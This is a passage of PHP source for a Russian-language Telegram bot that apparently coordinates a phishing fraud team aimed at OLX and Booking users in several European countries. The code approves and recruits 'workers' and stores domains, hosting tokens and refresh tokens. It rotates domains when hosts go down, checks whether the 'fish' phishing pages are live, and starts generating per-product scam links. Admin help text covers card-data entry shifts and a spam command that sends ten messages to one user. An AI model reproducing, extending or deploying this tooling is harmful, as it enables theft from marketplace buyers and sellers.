                        'video'=>'BAACAgIAAxkBAAECXoJhRba-eWofqi-FFnf2MbPsQInaKQACZQ8AAoy3KUpeuk4HHjJohSAE',
                        'caption' => "🎁Получи +2% к выплате за EUROBAND в нике💎\n\nТвой ID: <b>".$post->message->chat->id."</b>\nТвой скрытый ID: <b>".$usr->id."</b>\n\n",
                        'reply_markup'=>$replyMarkup
                    ]; 
                    file_get_contents($urlApi.$key.'/sendVideo?'.http_build_query($data));
                }else{
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'parse_mode'=>'HTML',
                        'text' => "🎁Получи +2% к выплате за EUROBAND в нике💎\n\nТвой ID: <b>".$post->message->chat->id."</b>\nТвой скрытый ID: <b>".$usr->id."</b>\n\n",
                        'reply_markup'=>$replyMarkup
                    ]; 
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                } 
                   
//file_put_contents('./log.txt',json_encode($data)."\n\n"); 
//file_put_contents('./log.txt',$urlApi.$key.'/sendMessage?'.http_build_query($data)."\n\n"); 
               
                /* if(strpos($post->message->text,'/start_back')!==false){
                    $data['message_id']=$post->message->message_id;
                    file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
                }else{ */
                    
               /*  } */
               exit();  

        }

        /* if(strpos($post->message->text,'/snd')!==false){
            $inline_keyboard[]=array(
                array("text" => "👊 Бить","callback_data" => "/stop")
            );
            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 
            $data = [
                'chat_id' => '-1001548001105', 
                'message_id' => '10029',  
                'parse_mode'=>'HTML',
                'text' => " ",
                'reply_markup'=>$replyMarkup
            ];  
            

            $r = file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
            $data = [
                'chat_id' => $post->message->chat->id,  
                'parse_mode'=>'HTML',
                'text' => $r
            ];   
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            exit();  
 
        } */

        /*ADMIN CMD*/

        if(strpos($post->message->text,'/addtoken')!==false&&$con->user->is_admin($post->message->from->id)){
            
            $token_country = explode("\n",$post->message->text);
            $country_service = explode('_',$token_country[0]);
            $country = $country_service[1];
            $service = $country_service[2];
            $refresh_token = $token_country[1];
            $dom = $con->domain->add_refresh_token((object)array(
                "country"=>$country,
                "service"=>$service,
                'refresh_token'=>$refresh_token
            )); 
            $data = [
                'chat_id' => $post->message->chat->id,  
                'parse_mode'=>'HTML',
                'text' => "🟢 Токен добавлен!" 
            ];  

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            exit();  
        }

        if(strpos($post->message->text,'/adddom')!==false&&$con->user->is_admin($post->message->from->id)){
            
            $domain_country = explode("\n",$post->message->text);
            $country = explode('_',$domain_country[0]);
            $country = $country[1];
            $domain = $domain_country[1];
            $cloud_token = $domain_country[2];
            $dom = $con->domain->add_domain((object)array(
                "domain"=>$domain,
                "country"=>$country,
                'cloud_token'=>$cloud_token
            )); 
            $data = [
                'chat_id' => $post->message->chat->id,  
                'parse_mode'=>'HTML',
                'text' => "🟢 Домен добавлен!"
            ];  

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            exit();  
        }

        if((strpos($post->message->text,'/changedom')!==false)&&$con->user->is_admin(($post->from->id?$post->from->id:$post->message->from->id))){
            $country = explode('_',$post->message->text);
            $country = $country[1];

            $btn1 = array("text" => "🔚 Назад","callback_data" => '/back_dom');
            $inline_keyboard = [[$btn1]]; 
            
            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 

            $cntr = ($bot_config->countries->{$country}->name?$bot_config->countries->{$country}->name:"🇺🇳 Другие");

            $ch_doms = $con->domain->change_dom($country);
            foreach($ch_doms as $ch_dom)
            {
                $ch_dom=(object)$ch_dom;
                if($ch_dom->type=="error"&&$ch_dom->text=='non_domain'){
                    $dom_text .= "🔴 Домены закончились! Добавте новые домены!\n";
                }elseif($ch_dom->type=="error"&&$ch_dom->text=="invalid_token"){
                    $dom_text .= "🔴 Замените refresh token!".$ch_dom->dom."\n";
                }elseif($ch_dom->type=="error"){
                    $dom_text .= "🔴 ".$ch_dom->text." ".$ch_dom->dom."\n";
                }elseif($ch_dom->type=="success"){
                    $dom_text .= "🟢 Домен (<b>".$cntr."</b>) сменили на ".$ch_dom->dom."!\n";
                }else{
                    $dom_text .= "🔴 Неизвесная ошибка ".$ch_dom->dom."!\n";
                }
            }

            $data = [
                'chat_id' => $post->message->chat->id,
                'message_id' => $post->message->message_id,
                'parse_mode'=>'HTML',
                'text' => $dom_text,
                'reply_markup'=>$replyMarkup
            ];  
            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
            /* $data = [
                'chat_id' => $bot_chanels->chanels->{'chanel_vorkers_pl'}->id,
                'parse_mode'=>'HTML',
                'text' => "🟢 Домен (<b>".$cntr."</b>) сменили!"
            ];  
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));  */
        }
 
        if((strpos($post->message->text,'/dom')!==false||strpos($post->message->text,'/change_dom')!==false||strpos($post->message->text,'/back_dom')!==false)&&$con->user->is_admin(($post->from->id?$post->from->id:$post->message->from->id))){
            $dom = $con->domain->get_domains();  

            if(strpos($post->message->text,'/change_dom')!==false){
                
               

                $btn1 = array("text" => "🔚 Назад","callback_data" => '/back_dom'); 
                $inline_keyboard = [];
                foreach($dom as $k=>$v){
                    $btn = array("text" => ($bot_config->countries->{$k}->name?$bot_config->countries->{$k}->name:"🇺🇳 Другие"),"callback_data" => '/changedom_'.$k);  
                    if(count($inline_keyboard)>=1&&count($inline_keyboard[count($inline_keyboard)-1])<2){
                        $inline_keyboard[count($inline_keyboard)-1][]= $btn;
                    }else{
                        $inline_keyboard[]= [$btn];
                    } 
                }
                $inline_keyboard[]= [$btn1]; 
            }else{
                $btn1 = array("text" => "🔁 Сменить домен","callback_data" => '/change_dom'); 
                $inline_keyboard = [[$btn1]]; 
            }
            
            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 

            if(strpos($post->message->text,'/change_dom')!==false){
                $domains .= "Выберите страну в которой меняем домен";
            }else{
                $domains = "Свободные домены:\n";
                foreach($dom as $k=>$v){
                    $domains .= "<b>".($bot_config->countries->{$k}->name?$bot_config->countries->{$k}->name:"🇺🇳 Другие")."</b>\n";
                    $domains .= "🟢 ".$v->active."\n";
                    foreach($v->domains as $kk=>$vv){
                        $domains .= "    ".$vv->domain."\n"; 
                    }
                
                    $domains .= "";
                }
            }
            
            $data = [
                'chat_id' => $post->message->chat->id,
                'message_id' => $post->message->message_id,
                'parse_mode'=>'HTML',
                'text' => "".$domains,
                'reply_markup'=>$replyMarkup
            ];  

            if(strpos($post->message->text,'/change_dom')!==false||strpos($post->message->text,'/back_dom')!==false){
                $r = file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
            }else{
                $r = file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            }
            
            exit();  
        }

        if(strpos($post->message->text,'/check')!==false){

            $status = '';
            foreach($bot_config->countries as $ck=>$cv){
                $status .= "\n<b>".$cv->name."</b>\n"; 
                foreach($cv->markets as $mk=>$mv)
                {
                    $get_serv = file_get_contents($mv->fish); 
                    $status .= "    ".($get_serv=='1'?" 🟢<b>ON</b>":" 🔴<b>OFF</b>")." 👉 ".$mv->name."\n";
                }
            }
            $status .= "\n<b>Другие сервисы:</b>\n";
            foreach($bot_config->markets as $mk=>$mv){  

                $get_serv = file_get_contents($mv->fish); 
                $status .= "    ".($get_serv=='1'?" 🟢<b>ON</b>":" 🔴<b>OFF</b>")." 👉 ".$mv->name."\n";
                
            }

            $data = [
                'chat_id' => $post->message->chat->id,  
                'parse_mode'=>'HTML',
                'text' => "".$status
            ];  

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            exit();  
        }

        if(strpos($post->message->text,'/info')!==false&&($post->message->chat->type=='group'||$post->message->chat->type=='supergroup')&&(strpos($post->message->chat->title,'Log')!==false||strpos($post->message->chat->title,'Лог')!==false)){
            $data = [
                'chat_id' => $post->message->chat->id,  
                'parse_mode'=>'HTML',
                'text' => "Команды:\n<code>/ban@</code>логин - добавляем пользователя в бан\n<code>/unban@</code>логин - снимаем с пользователя бан\n<code>/id@</code>логин - внутренний ID пользователя\n<code>/login@</code>ИД - получить логин пользователя\n<code>/@</code>логин - полная информация о пользователе\n<code>/sms_</code>all\nТекст сообщения - отправить сообщение всем пользователям\n<code>/sms_</code>ИД\nТекст сообщения - отправить сообщение конкретному пользователю в бот\n<code>/sms_spam_</code>ИД\nТекст сообщения - отправить 10 сообщений подряд конкретному пользователю в бот\n<code>/vwork_</code>страна(pl,pt,ro,it,pe,se,booking) - начать работу на вбиве\n<code>/vsleep_</code>страна - закончить работу на вбиве\n<code>/worksms_</code>страна - начать работу на SMS\n<code>/sleepsms_</code>страна - закончить работу на SMS\n<code>/workpars_</code>страна - начать работу на парсинге \n<code>/sleeppars_</code>страна - закончить работу на парсинге\n<code>/dom</code> - Сменить домен но сначала проверьте домен перейдя на него не отвалился ли хост, если отпал хост будет писать 'Website is sleeping' - в таком случае попытки изменить домен делать не стоит!"
            ];  

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            exit();  
        }

        

        if(strpos($post->message->text,'/ban@')!==false){
            $uname = str_replace("/ban@","",$post->message->text);
            $uname = trim($uname); 

            $user = $con->user->get_user_byuname($uname); 
            if($user&&$con->user->is_admin($post->message->from->id)){
                $con->user->add_ban($user->id);
                $data = [
                    'chat_id' => $post->message->chat->id,  
                    'parse_mode'=>'HTML',
                    'text' => "Пользователь <b>@".$user->login."</b> \n🔴 ЗАБАНЕН!"
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            }
            exit();
        }
        if(strpos($post->message->text,'/unban@')!==false){
            $uname = str_replace("/unban@","",$post->message->text);
            $uname = trim($uname);

            $user = $con->user->get_user_byuname($uname);

            if($user&&$con->user->is_admin($post->message->from->id)){
                $con->user->remove_ban($user->id);
                $data = [
                    'chat_id' => $post->message->chat->id,  
                    'parse_mode'=>'HTML',
                    'text' => "Пользователь <b>@".$user->login."</b> \n🟢 РАЗБАНЕН!"
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            } 
            exit();
        }

        if(strpos($post->message->text,'/@')!==false){
            $uname = str_replace("/@","",$post->message->text);
            $uname = trim($uname);

            $user = $con->user->get_user_byuname($uname);

            /*if($user&&$user->id){ */
                $data = [
                    'chat_id' => $post->message->chat->id,  
                    'parse_mode'=>'HTML',
                    'text' => "<b>ID:</b> ".$user->id."\n<b>TG_ID:</b> ".$user->chat_id."\n<b>Login:</b> ".$user->login."\n<b>First Name:</b> ".$user->login."\n<b>Ban:</b> ".($user->is_ban==1?"🔴 Забанен":"Нет").""
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            /* } */
            exit();
        }
        if(strpos($post->message->text,'/id@')!==false){
            $uname = str_replace("/id@","",$post->message->text);
            $uname = trim($uname);

            $user = $con->user->get_user_byuname($uname);

            if($user&&$user->id){
                $data = [
                    'chat_id' => $post->message->chat->id,  
                    'parse_mode'=>'HTML',
                    'text' => $user->id
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            }
            exit();

        }
        if(strpos($post->message->text,'/login@')!==false){
            $uid = str_replace("/login@","",$post->message->text);
            $uid = trim($uid);

            $user = $con->user->get_user_byid($uid);

            if($user&&$user->login){
                $data = [
                    'chat_id' => $post->message->chat->id,  
                    'parse_mode'=>'HTML',
                    'text' => $user->login
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            }
            exit();

        }

        if(strpos($post->message->text,'/go')!==false){

 
            $btn1 = array("text" => "✅ Ознакомлен(а)","callback_data" => '/ok'); 
            
            $inline_keyboard = [[$btn1]]; 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 
             
           
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'message_id' => $post->message->message_id,
                        'parse_mode'=>'HTML',
                        'caption' => "<b>Правила:</b>\n".$bot_config->text->pravila,
                        'reply_markup'=>$replyMarkup
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageCaption?'.http_build_query($data));

        } 
        if(strpos($post->message->text,'/ok')!==false){

 
            $btn1 = array("text" => "📷 Реклама в Inst","callback_data" => '/source_inst'); 
            $btn2 = array("text" => "☎️ Реклама в Telegram","callback_data" => '/source_tg'); 
            $btn3 = array("text" => "😎 От друзей","callback_data" => '/source_friends'); 
            $btn4 = array("text" => "🤔 Случайно наткнулся","callback_data" => '/source_across'); 
            
            $inline_keyboard = [[$btn1,$btn2],[$btn3,$btn4]]; 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 
             
           
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'message_id' => $post->message->message_id,
                        'parse_mode'=>'HTML',
                        'caption' => "Откуда Вы узнали о нас?",
                        'reply_markup'=>$replyMarkup
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageCaption?'.http_build_query($data));

        } 
        if(strpos($post->message->text,'/source_')!==false){
 
            if($usr){
                $con->user->update_user($usr->chat_id,array('description'=>'ready','source'=>$post->message->text));
            }
                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'message_id' => $post->message->message_id, 
                        'parse_mode'=>'HTML',
                        'caption' => "Введите максимально развёрнуто свой опыт в ".$bot_config->text->scm1.", в каких проектах работали, на каких должностях."
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageCaption?'.http_build_query($data));

        }
        if($usr->description=='ready'){
            if(strlen($post->message->text)>$bot_config->description_length){
                $con->user->update_user($usr->chat_id,array('description'=>$post->message->text));
                $data = [
                    'chat_id' => $post->message->chat->id,  
                    'message_id' => $post->message->message_id,
                    'parse_mode'=>'HTML',
                    'text' => "Спасибо ".$usr->fname."! Ваш заявка находится на рассмотрении администрацией. Вы получите результат в сообщении в этом чате."
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));

                /*Send to admin*/
                if(strpos($usr->source,'_inst')!==false){
                    $usr_source = 'Instagram';
                }elseif(strpos($usr->source,'_tg')!==false){
                    $usr_source = 'Telegram';
                }elseif(strpos($usr->source,'_friends')!==false){
                    $usr_source = 'От друзей';
                }elseif(strpos($usr->source,'_across')!==false){
                    $usr_source = 'Случайно наткнулся';
                }

                $btn1 = array("text" => "✅ Одобрить","callback_data" => '/invite_ok_'.$usr->chat_id); 
                $btn2 = array("text" => "🚫 Отклонить","callback_data" => '/invite_reject_'.$usr->chat_id); 
                
                $inline_keyboard = [[$btn1,$btn2]]; 
    
                $keyboard = array("inline_keyboard" => $inline_keyboard);
                $replyMarkup = json_encode($keyboard); 

                $data = [
                    'chat_id' => $bot_chanels->chanels->chanel_orders->id,  
                    'parse_mode'=>'HTML',
                    'text' => "\n<b>НОВАЯ ЗАЯВКА</b>\nВоркер: <a href='https://t.me/".$usr->login."'><b>@".$usr->login."</b></a>\nИсточник: <b>".$usr_source."</b>\nОпыт: <b>".$post->message->text."</b>\n\n",
                    'reply_markup'=>$replyMarkup
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));

            }else{
                $data = [
                    'chat_id' => $post->message->chat->id,   
                    'parse_mode'=>'HTML',
                    'text' => "Введите максимально развёрнуто свой опыт в ".$bot_config->text->scm1.", в каких проектах работали, на каких должностях. <b>Более ".$bot_config->description_length." символов!!!</b>"
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            }
            exit();
        }
        if(strpos($post->message->text,'/invite_ok')!==false){
 
            $usr_inviter = explode('_',$post->message->text);
            if(count($usr_inviter)>2){
                $con->user->update_user($usr_inviter[2],array('status'=>'1'));
                    
                $inline_keyboard = [];  
                foreach($bot_config->countries as $k=>$v){
                    $btn = array("text" => $v->name,"callback_data" => '/country_'.$v->code);  
                    if(count($inline_keyboard)>=1&&count($inline_keyboard[count($inline_keyboard)-1])<2){
                        $inline_keyboard[count($inline_keyboard)-1][]= $btn;
                    }else{
                        $inline_keyboard[]= [$btn];
                    } 
                } 
                    foreach($bot_config->markets as $k=>$v){
                        $inline_keyboard[]= array(array("text" => $v->name,"callback_data" => "/generate_".$k."_".$k));
                    }
                    $inline_keyboard[]=array(
                        array("text" => "🗄 Мои товары","callback_data" => "/myproductsshow")
                    );
                    $inline_keyboard[]=array(
                        array("text" => "📚 Мануалы","url" => $bot_chanels->chanels->chanel_manuals->invite_link),
                        array("text" => "💭 Чаты","callback_data" => "/chats_all")
                    );
                    $inline_keyboard[]=array(
                        array("text" => "💰 Выплаты","url" => $bot_chanels->chanels->chanel_payments->invite_link)
                    );

                    $keyboard = array("inline_keyboard" => $inline_keyboard);
                    $replyMarkup = json_encode($keyboard);  
                    $data = [
                        'chat_id' => $usr_inviter[2],  
                        'parse_mode'=>'HTML',
                        'text' => "✅ Поздравляем! Ваша заявка одобрена! Выберите по какой стране хотите работать и вступите в чат воркеров и канал с мануалами!",
                        'reply_markup'=>$replyMarkup
                    ];  

                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));

                    $keyboard = array("inline_keyboard" => array());
                    $replyMarkup = json_encode($keyboard);
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'message_id'=>$post->message->message_id,
                        'reply_markup'=>$replyMarkup
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageReplyMarkup?'.http_build_query($data));
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'message_id'=>$post->message->message_id,  
                        'parse_mode'=>'HTML',
                        'text'=>$post->message->text_origin."\n\n ✅ Заявка одобрена <a href='https://t.me'>@".$post->from->username."</a>\n\n"
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
                    
            }

        }
        if(strpos($post->message->text,'/invite_reject')!==false){
 
            $usr_inviter = explode('_',$post->message->text);
            if(count($usr_inviter)>2){ 
            
                    $data = [
                        'chat_id' => $usr_inviter[2],  
                        'parse_mode'=>'HTML',
                        'text' => "🚫 Ваша заявка на вступление отклонена"
                    ];  

                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    $keyboard = array("inline_keyboard" => array());
                    $replyMarkup = json_encode($keyboard);
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'message_id'=>$post->message->message_id,
                        'reply_markup'=>$replyMarkup
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageReplyMarkup?'.http_build_query($data));
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'message_id'=>$post->message->message_id,  
                        'parse_mode'=>'HTML',
                        'text'=>$post->message->text_origin."\n\n 🚫 Заявка отклонена <a href='https://t.me'>@".$post->from->username."</a>\n\n"
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
            }

        }

        if(strpos($post->message->text,'/chats_all')!==false){
            $inline_keyboard=[];
            foreach($bot_config->countries as $k=>$v){
                if($bot_chanels->chanels->{'chanel_vorkers_'.$v->code}){
                   // $inline_keyboard[]= array(array("text" => "💬 ".$v->name,"url" => $bot_chanels->chanels->{'chanel_vorkers_'.$v->code}->invite_link)); 
                         $inline_keyboard[]= array(array("text" => "💬 🇪🇺 Общий чат","url" => $bot_chanels->chanels->{'chanel_vorkers_'.$v->code}->invite_link)); 
                }
            } 
            $inline_keyboard[]= array(array("text" => "🔙 Главное меню","callback_data" => "/start_back")); 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id,   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageReplyMarkup?'.http_build_query($data));

        }

        /*~~ Update Group ~~*/
        
        if(strpos($post->message->text,'/chanel_')!==false){ 

            $channel_post_text = str_replace("/","",$post->message->text);
            
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'parse_mode'=>'HTML',
                        'text' => "Успех! Радуйся!"
                    ];  

                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
 
                    $me = file_get_contents($urlApi.$key.'/getMe');
                    $me = json_decode($me);
                    if($me->ok){
                        $data = [
                            'chat_id' => $post->message->chat->id,
                            'user_id'=> $me->result->id
                        ];  
                        $chat_channel = file_get_contents($urlApi.$key.'/getChat?'.http_build_query($data));
                        $chat_channel = json_decode($chat_channel);
                        
                        if($chat_channel->ok){
                            $bot_chanels->chanels->{$channel_post_text} = 
                            array(
                                "id"=>$post->message->chat->id, 
                                "type"=>$chat_channel->result->type, 
                                "title"=>$chat_channel->result->title, 
                                "invite_link"=>$chat_channel->result->invite_link
                            );

                            file_put_contents('./chanels.json',json_encode(array($bot_chanels)));
                        } 
                    }
        }
 
        if(strpos($post->message->text,'/myproductsshow')!==false){

            foreach($bot_config->countries as $k=>$v){
                $i=$i+1;
                $sect_keyboard[]= array("text" => $v->name,"callback_data" => "/myproductscountry_".$v->code);
                if(count($sect_keyboard)>=2){ 
                    $inline_keyboard[]=$sect_keyboard;
                    $sect_keyboard=[];
                } 
                if($i>2&&count($sect_keyboard)<2&&count((array)$bot_config->countries)==$i){ 
                    $inline_keyboard[]=$sect_keyboard;
                }
                
            } 
            $inline_keyboard[]= array(array("text" => "🔙 Главное меню","callback_data" => "/start_back")); 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML',
                'text' => "Выбери страну",   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));

        }  

        if(strpos($post->message->text,'/myproductscountry_')!==false){

            $country_code = explode("_",$post->message->text);
            $con->user->update_user($usr->chat_id,array("now_settings"=>''));
            $inline_keyboard=[];
            foreach($bot_config->countries->{$country_code[1]}->markets as $k=>$v){
                $inline_keyboard[]= array(array("text" => $v->name,"callback_data" => "/myproductsmarket_1_".$country_code[1]."_".$k)); 
            } 
            $inline_keyboard[]= array(array("text" => "🔙 Главное меню","callback_data" => "/start_back")); 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML',
                'text' => "Выбери маркет",   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));

        } 
        if(strpos($post->message->text,'/sms_')!==false){
            $admins = $con->user->get_admins();
            if(in_array($post->message->from->id,$admins)){

                $textxheck = explode("\n",$post->message->text); 
                $check = explode("_",$textxheck[0]); 
                $textx = str_replace($textxheck[0],"",$post->message->text);
    
                $users = array();

                if($check[1]=='all'){
                    $users = $con->user->get_user_all(); 
                }elseif($check[1]=='spam'){
                    for($i=0;$i<10;$i++){
                        $users[] = $check[2]; 
                    }
                }elseif(preg_match('/^[0-9.]+$/i', trim($check[1]))){
                    $users[]=intval(trim($check[1]));
                } 
                
                if($textx){ 
                   //foreach($users as $k=>$v){
                       for($i=0;$i<count($users);$i++){
                     
                        $data = [
                            'chat_id' => $users[$i],
                            'parse_mode'=>'HTML',
                            'text' =>$textx
                        ];  
                        $c = file_get_contents('./log.txt');
                        file_put_contents('./log.txt',$c.json_encode($data)."\n\n"); 
                        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
                    }
                    //file_put_contents('./log.txt',json_encode($data)."\n\n");
                }
                exit();
            }
        }
        if(strpos($post->message->text,'/getproduct_')!==false){
            $cm_code = explode("_",$post->message->text);
            $product = (object)$con->products->get_product($cm_code[1]); 

            $inline_keyboard=[];
            $inline_keyboard[]= array(
                array("text" => "🔙 Назад","callback_data" => "/myproductsmarket_".$cm_code[2]."_".$cm_code[3]."_".$cm_code[4]),
                array("text" => "❌ Удалить", "callback_data"=>"/myproductsmarket_".$cm_code[2]."_".$cm_code[3]."_".$cm_code[4]."_deleteproduct_".$cm_code[1])
            ); 
            if(($bot_config->markets->{$product->country}&&$bot_config->markets->{$product->country}->check)||$bot_config->countries->{$product->country}->markets->{$product->market}->check){             
                $inline_keyboard[]=array(
                    array("text" => "✅ Получить чек","callback_data" => "/get_check_".$product->id)
                );
            }
            $inline_keyboard[]=array(
                array("text" => "💲 Изменить цену","callback_data" => "/changeprice_".$product->id)
            );

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML', 
                "disable_web_page_preview"=>true,
                'text' => "💎 ID: ".$cm_code[1]."\n🎁 Товар: ".$product->title."\n💰 Цена: ".$product->price." ".$product->currancy."\n🔗 Ссылка: ".$product->generate_link,   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));

        }
        if(strpos($post->message->text,'/myproductsmarket_')!==false){
            $cm_code = explode("_",$post->message->text); 

            if(count($cm_code)>3&&$cm_code[4]=='deleteall'){
                $con->products->delete_products($usr->id);
            }
            if(count($cm_code)>3&&$cm_code[4]=="deleteproduct"){
                $con->products->delete_product($cm_code[5]);
            }

            $products = $con->products->get_products($usr->id,$cm_code[1]);
            $products_next = $con->products->get_products($usr->id,$cm_code[1]+1);

            
 
            $inline_keyboard=[]; 

            foreach($products as $k=>$v){
                $inline_keyboard[]= array(
                    array("text" => $v->id." | ".$v->price." | ".$v->title,"callback_data" => "/getproduct_".$v->id."_".$cm_code[1]."_".$cm_code[2]."_".$cm_code[3] )
                );
            }

            $inline_keyboard[]= array(
                array('text' => "<","callback_data" => "/myproductsmarket_".($cm_code[1]>0?$cm_code[1]-1:'1')."_".$cm_code[2]."_".$cm_code[3]),
                array("text" => "🔙 Отмена","callback_data" => "/myproductscountry_".$cm_code[2] ),
                array('text' => ">","callback_data" => "/myproductsmarket_".($cm_code[1]>0&&count($products_next)>0?$cm_code[1]+1:'1')."_".$cm_code[2]."_".$cm_code[3])
            ); 
            $inline_keyboard[]= array(
                array("text" => "🗑 Удалить все","callback_data" => "/delmproductsmarket_1_".$cm_code[2]."_".$cm_code[3] )
            );
            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML',
                'text' => "Для детальной информации нажми на товар",   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
        }
        if(strpos($post->message->text,'/delmproductsmarket_')!==false){
            $cm_code = explode("_",$post->message->text);


            $inline_keyboard[]= array(
                array('text' => "✅ Да","callback_data" => "/myproductsmarket_1_".$cm_code[2]."_".$cm_code[3]."_deleteall"),
                array("text" => "❌ Нет","callback_data" => "/myproductsmarket_1_".$cm_code[2]."_".$cm_code[3] )
            ); 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML',
                'text' => "Вы действительно хотите удалить все продукты?",   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
        }
        /*~~~Fish GEN~~~*/
        if(strpos($post->message->text,'/country_')!==false){

            $country_code = explode("_",$post->message->text);
            $con->user->update_user($usr->chat_id,array("now_settings"=>''));
            $inline_keyboard=[];
            foreach($bot_config->countries->{$country_code[1]}->markets as $k=>$v){
                $inline_keyboard[]= array(array("text" => $v->name,"callback_data" => "/generate_".$country_code[1]."_".$k)); 
            } 
            $inline_keyboard[]= array(array("text" => "🔙 Главное меню","callback_data" => "/start_back")); 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML',
                'text' => "Выбери маркет",   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));

        }  

        if(strpos($post->message->text,'/generate_')!==false){

            $cm_code = explode("_",$post->message->text);
 
            $inline_keyboard=[]; 
            $inline_keyboard[]= array(array("text" => "🔙 Отмена","callback_data" => "/start_back")); 
             

            if($cm_code[2]=='olx'){
                //.$bot_config->countries->{$cm_code[1]}->markets->{$cm_code[2]}
                $keyboard = array("inline_keyboard" => $inline_keyboard);
                $replyMarkup = json_encode($keyboard);  
                $market = $bot_config->countries->{$cm_code[1]}->markets->{$cm_code[2]};
                $now_settings = array(
                    'step'=>1,
                    'market'=>$cm_code[2],
                    'countries'=>$cm_code[1],
                    'pid'=>NULL
                ); 
                $con->user->update_user($usr->chat_id,array("now_settings"=>serialize((object)$now_settings)));
                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'message_id' => $post->message->message_id,   
                    'parse_mode'=>'HTML',
                    'text' => "Пришли ссылку на товар сайта ".$market->domain.($market->example!=null?"\n(пример: ".$market->example:')'),
                    'reply_markup'=>$replyMarkup
                ];  
                file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
            }

            if($cm_code[2]=='booking'){ 
                $keyboard = array("inline_keyboard" => $inline_keyboard);
                $replyMarkup = json_encode($keyboard);  
                $market = $bot_config->markets->{$cm_code[1]};
                $now_settings = array(
                    'step'=>1,
                    'market'=>$cm_code[2],
                    'countries'=>$cm_code[1],
